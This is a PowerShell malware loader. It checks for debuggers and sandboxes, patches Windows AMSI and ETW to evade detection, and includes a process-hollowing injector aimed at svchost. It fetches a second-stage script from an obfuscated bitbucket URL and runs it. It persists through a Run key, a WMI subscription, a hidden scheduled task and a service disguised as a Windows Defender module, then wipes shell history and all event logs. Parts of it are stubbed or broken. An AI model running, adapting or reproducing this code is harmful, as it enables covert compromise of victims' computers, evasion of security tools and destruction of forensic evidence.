$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'

# Anti-Debug: Check for debugger
if(([System.Diagnostics.Debugger]::IsAttached) -or ((Get-Process -ErrorAction SilentlyContinue).Count -lt 40)){exit}
$WzJ55jVkW209JMgB=Get-CimInstance Win32_ComputerSystem
if($WzJ55jVkW209JMgB.NumberOfLogicalProcessors -lt 2){exit}
if($WzJ55jVkW209JMgB.TotalPhysicalMemory -lt 4GB){exit}


# AMSI Hardware Patch using C#
$iVz6JR7RE6YUihCo=@'
using System;
using System.Runtime.InteropServices;
public class AmsiKiller {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static void Kill() {
        IntPtr m = GetModuleHandle("amsi.dll");
        if(m == IntPtr.Zero) return;
        IntPtr a = GetProcAddress(m, "AmsiScanBuffer");
        if(a == IntPtr.Zero) return;
        uint o;
        VirtualProtect(a, (UIntPtr)5, 0x40, out o);
        byte[] p = new byte[6] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
        Marshal.Copy(p, 0, a, 6);
    }
}
'@
Add-Type -TypeDefinition $iVz6JR7RE6YUihCo -Language CSharp
[AmsiKiller]::Kill()

# ETW Patch
$waNBFdTNpMGHCIjD=[Ref].Assembly.GetTypes()|?{$_.Name-like"*iUtils"}|Select -First 1
$0vOJdM3eVhlxKOOq=$waNBFdTNpMGHCIjD.GetFields([System.Reflection.BindingFlags]40)|?{$_.Name-like"*tFailed"}|Select -First 1
$0vOJdM3eVhlxKOOq.SetValue($null,$true)


# DLL Unhooking: Load clean NTDLL
$HhrenF06NYMydc4i=@'
using System;
using System.Runtime.InteropServices;
using System.IO;
public class Unhooker {
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern IntPtr VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    public static void Refresh() {
        string ntdll = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "ntdll.dll");
        byte[] clean = File.ReadAllBytes(ntdll);
        IntPtr baseAddr = LoadLibrary("ntdll.dll");
        if(baseAddr != IntPtr.Zero) {
            // This is simplified - real implementation would map sections
        }
    }
}
'@
Add-Type -TypeDefinition $HhrenF06NYMydc4i -Language CSharp


$WJdvFlJGnqerZu0t=@'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class Hollower {
    [DllImport("ntdll.dll")] public static extern int NtUnmapViewOfSection(IntPtr h, IntPtr a);
    [DllImport("ntdll.dll")] public static extern int NtAllocateVirtualMemory(IntPtr h, ref IntPtr a, int z, ref uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateProcess(string a, string c, IntPtr sa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr apc, IntPtr t, IntPtr p);
    [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr t);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, UIntPtr s, uint p, out uint o);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO { public uint cb; public string r; public string d; public string t; public uint x; public uint y; public uint w; public uint h; public uint f; public uint s; public IntPtr i; public IntPtr o; public IntPtr e; }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr h; public IntPtr t; public uint pid; public uint tid; }
    
    public static void Inject(byte[] s) {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi;
        si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
        
        // Create suspended svchost.exe
        if(CreateProcess(@"C:\Windows\System32\svchost.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x00200000 | 0x08000000, IntPtr.Zero, null, ref si, out pi) == IntPtr.Zero)
            return;
        
        // Unmap original
        NtUnmapViewOfSection(pi.h, (IntPtr)0x10000);
        
        // Allocate memory
        IntPtr b = (IntPtr)0x10000;
        uint sz = (uint)s.Length + 0x1000;
        NtAllocateVirtualMemory(pi.h, ref b, 0, ref sz, 0x3000, 0x40);
        
        // Write payload
        uint w;
        WriteProcessMemory(pi.h, b, s, (uint)s.Length, out w);
        
        // Queue APC
        QueueUserAPC(b, pi.t, IntPtr.Zero);
        
        // Resume thread
        ResumeThread(pi.t);
    }
}
'@
Add-Type -TypeDefinition $WJdvFlJGnqerZu0t -Language CSharp


$FF2rXFtEZjZAu1xX=[char[]](104,116,116,112,115,58,47,47,98,105,116,98,117,99,107,101,116,46,111,114,103,47,118,111,114,116,101,120,100,114,97,120,47,118,111,114,116,101,120,47,100,111,119,110,108,111,97,100,115,47,86,111,114,103,111,100,108,97,115,116,46,112,115,49)-join''
$Qky7YL5zaOzU8gnQ=cmd /c ('curl -sLkH "User-Agent: Mozilla/5.0" "'+$FF2rXFtEZjZAu1xX+'"')
if(-not $Qky7YL5zaOzU8gnQ -or -not ($Qky7YL5zaOzU8gnQ -like '*$*')){exit}

$ZLPrBJrbL3FqiPdm=[System.Text.Encoding]::UTF8.GetBytes($Qky7YL5zaOzU8gnQ)


[Hollower]::Inject($ZLPrBJrbL3FqiPdm)

IEX($Qky7YL5zaOzU8gnQ)


$QHHzTKjTYCqvv9ps=[char[]](72,75,67,85,58,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110)-join''
$khV9qKoQTv0whWou="WinUpdate_"+(Get-Random -Max 99999)
$IkpdoBmktJseFpDB="powershell -W Hidden -C `"IEX(curl -s '"+$FF2rXFtEZjZAu1xX+"')`""
Set-ItemProperty -Path $QHHzTKjTYCqvv9ps -Name $khV9qKoQTv0whWou -Value $IkpdoBmktJseFpDB -Force | Out-Null

$OGm9iEARj66Gwu4v="WMI_"+(Get-Random -Max 99999)
$0BH4hatkjMCEEr9J="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0"
$HCnd1UADjZfuCplU=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Args @{Name=$OGm9iEARj66Gwu4v;EventNamespace='root\cimv2';QueryLanguage='WQL';Query=$0BH4hatkjMCEEr9J} -ErrorAction SilentlyContinue
$dw46aZ9aRh5zZw64=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Args @{Name=$OGm9iEARj66Gwu4v;CommandLineTemplate=$IkpdoBmktJseFpDB} -ErrorAction SilentlyContinue
if($HCnd1UADjZfuCplU -and $dw46aZ9aRh5zZw64){
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Args @{Filter=$HCnd1UADjZfuCplU;Consumer=$dw46aZ9aRh5zZw64} | Out-Null
}

$fsQMDBL2loohtTzT="SecurityUpdate_"+(Get-Random -Max 9999)
$aFdI0Rs5IYHxxLW6=New-ScheduledTaskAction -Execute "powershell" -Argument "-W Hidden -C IEX(curl -s '$FF2rXFtEZjZAu1xX')"
$PEYqK7pIrI5VqK5H=New-ScheduledTaskTrigger -AtLogOn
$GQcQWKvKJK3XTe1v=New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $fsQMDBL2loohtTzT -Action $aFdI0Rs5IYHxxLW6 -Trigger $PEYqK7pIrI5VqK5H -Settings $GQcQWKvKJK3XTe1v -Force | Out-Null

$13CgIsXZBzXwhcv7="WinDef_"+(Get-Random -Max 999)
$bhIKUphK9Ts084U0="cmd /c '"+$IkpdoBmktJseFpDB+"'"
sc.exe create $13CgIsXZBzXwhcv7 binPath= "$bhIKUphK9Ts084U0" start= delayed-auto displayname= "Windows Defender Security Module" type= share | Out-Null

$gGYDVgWx21uK9rU7=([char[]](72,75,76,77,58,92,83,89,83,84,69,77,92,67,117,114,114,101,110,116,67,111,110,116,114,111,108,83,101,116,92,67,111,110,116,114,111,108,92,83,101,115,115,105,111,110,32,77,97,110,97,103,101,114)-join'')
:
try{
    $3zHoeEsb4dKzCQfH=(Get-ItemProperty -Path $gGYDVgWx21uK9rU7 -Name BootExecute -ErrorAction SilentlyContinue)
}catch{}


Remove-Item -Path ([char[]](36,101,110,118,58,65,80,80,68,65,84,65,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,80,111,119,101,114,83,104,101,108,108,92,80,83,82,101,97,100,76,105,110,101,92,67,111,110,115,111,108,101,72,111,115,116,95,104,105,115,116,111,114,121,46,116,120,116)-join'') -Force -ErrorAction SilentlyContinue
Clear-EventLog -LogName * -ErrorAction SilentlyContinue
